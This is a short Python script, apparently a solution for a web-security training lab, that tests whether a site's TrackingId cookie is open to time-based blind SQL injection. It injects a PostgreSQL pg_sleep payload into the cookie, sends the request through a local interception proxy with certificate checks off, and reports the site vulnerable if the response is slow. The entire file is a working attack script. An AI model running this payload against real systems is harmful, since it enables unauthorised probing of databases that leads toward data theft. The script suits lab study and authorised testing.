import sys
import requests
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': 'yDnnFERILROeu2cl' + sqli_payload_encoded, 'session': '1BcmFJ0abxA6CqFpFLJGJPpkhAFUB1HI'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print("[+] Vulnerable to blind time-based sql injection!")
    else:
        print("[+] Not vulnerable to blind time-based sql injection.")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("Example: %s www.emaple.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    print("[+] checking if tracking cookie is vulnerable to time-based sql injection...")
    blind_sqli_check(url)


if __name__ =="__main__":
    main()